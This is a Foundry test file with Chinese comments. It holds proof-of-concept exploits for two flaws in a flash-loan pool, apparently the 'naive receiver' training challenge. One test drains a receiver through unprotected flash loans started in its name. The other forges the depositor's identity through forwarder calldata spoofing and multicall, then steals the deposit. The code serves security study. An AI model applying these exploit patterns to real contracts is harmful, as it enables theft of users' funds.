// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {NaiveReceiverPool, Multicall} from "pool/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "pool/FlashLoanReceiver.sol";
import {BasicForwarder} from "pool/BasicForwarder.sol";
import {WETH} from "solmate/tokens/WETH.sol";

/**
 * PoC — 04-naive-receiver 的两个独立缺陷
 *
 *  N-01 unprotected-flashloan-initiation : 任何人可以以受害 receiver 名义发起 flashLoan，手续费从 receiver 扣
 *  N-02 forwarder-spoofing              : _msgSender() 直接信任 calldata 尾部 20 字节，
 *                                         配合 Multicall 的 delegatecall 可伪造存款人身份
 */
contract NaiveReceiverPoC is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address recovery = makeAddr("recovery");

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;
    uint256 constant FIXED_FEE = 1e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    function setUp() public {
        startHoax(deployer);
        weth = new WETH();
        forwarder = new BasicForwarder();
        // constructor 把自己作为 feeReceiver，并 _deposit(msg.value) 记在 msg.sender(deployer) 名下
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(address(weth)), deployer);

        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);
        vm.stopPrank();
    }

    /* ------------------------------------------------------------------ */
    /* N-01：flashLoan 不校验发起者与 receiver 的关系                      */
    /* ------------------------------------------------------------------ */
    function test_PoC_N01_unprotectedFlashLoanDrainsReceiver() public {
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER, "precondition: receiver funded");
        uint256 feeRecipientDepositBefore = pool.deposits(deployer);

        vm.startPrank(attacker);
        // 攻击者自己没有任何资金，也不需要 receiver 授权
        for (uint256 i = 0; i < WETH_IN_RECEIVER / FIXED_FEE; i++) {
            pool.flashLoan(receiver, address(weth), 0, "");
        }
        vm.stopPrank();

        // 不变式被破坏：receiver 的 WETH 被清空，且一分钱都没进攻击者口袋之外的第三方
        console.log("receiver WETH before/after:", WETH_IN_RECEIVER, "/", weth.balanceOf(address(receiver)));
        console.log("fee deposits delta       :", pool.deposits(deployer) - feeRecipientDepositBefore);
        assertEq(weth.balanceOf(address(receiver)), 0, "invariant broken: receiver drained");
        assertEq(
            pool.deposits(deployer) - feeRecipientDepositBefore,
            WETH_IN_RECEIVER,
            "fee receiver credited with the whole drained amount"
        );
        assertEq(attacker.balance, 0, "attacker spent nothing");
    }

    /* ------------------------------------------------------------------ */
    /* N-02：_msgSender() 信任 calldata 尾部字节，可伪造身份               */
    /* ------------------------------------------------------------------ */
    function test_PoC_N02_forwarderSpoofStealsVictimDeposit() public {
        (address attackerAddr, uint256 attackerPk) = makeAddrAndKey("attacker-eoa");
        address victim = deployer; // 唯一的存款大户：构造时存了 WETH_IN_POOL

        assertEq(pool.deposits(victim), WETH_IN_POOL, "precondition: victim deposit");
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL, "precondition: pool holds WETH");

        // withdraw(uint256,address) 的 calldata 尾部拼上受害者地址（20 字节）
        bytes memory withdrawal = abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL, payable(attackerAddr)));
        bytes memory spoofed = abi.encodePacked(withdrawal, victim);

        bytes[] memory calls = new bytes[](1);
        calls[0] = spoofed;

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: attackerAddr, // 签名者就是攻击者自己 —— 受害者全程不参与
            target: address(pool),
            value: 0,
            gas: 1_000_000,
            nonce: 0,
            data: abi.encodeCall(Multicall.multicall, (calls)),
            deadline: block.timestamp + 1 days
        });

        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(attackerAddr);
        forwarder.execute(request, signature);

        // 不变式被破坏：受害者存款被清零，攻击者拿到等额 WETH
        console.log("deposits[victim] after   :", pool.deposits(victim));
        console.log("WETH balance attacker    :", weth.balanceOf(attackerAddr));
        console.log("WETH balance pool        :", weth.balanceOf(address(pool)));
        assertEq(pool.deposits(victim), 0, "invariant broken: victim deposit cleared");
        assertEq(weth.balanceOf(attackerAddr), WETH_IN_POOL, "attacker received victim deposit");
        assertEq(weth.balanceOf(address(pool)), 0, "pool emptied");
    }
}
